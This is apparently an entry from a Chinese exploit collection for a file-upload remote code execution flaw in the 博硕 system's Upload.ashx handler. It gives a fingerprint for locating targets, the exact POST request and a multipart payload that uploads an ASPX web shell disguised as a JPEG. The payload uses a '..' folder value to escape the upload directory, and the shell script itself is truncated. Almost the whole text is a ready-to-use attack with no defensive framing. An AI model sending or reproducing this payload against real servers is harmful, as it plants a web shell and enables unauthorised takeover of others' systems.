# 博硕BGMUpload.ashx存在文件上传致RCE漏洞

- **系统**：博硕　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST /WebUpload/server/Upload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary12345678…`

**请求体 / payload**
```
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="id"
WU_FILE_0
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="name"
1.aspx
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="size"
10000
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="type"
image/jpeg
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="OwnBaseFolder"
..
------WebKitFormBoundary1234567890
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateReq…（脚本共 1126 字，完整版见原文）
```
- **预期**：200　|　—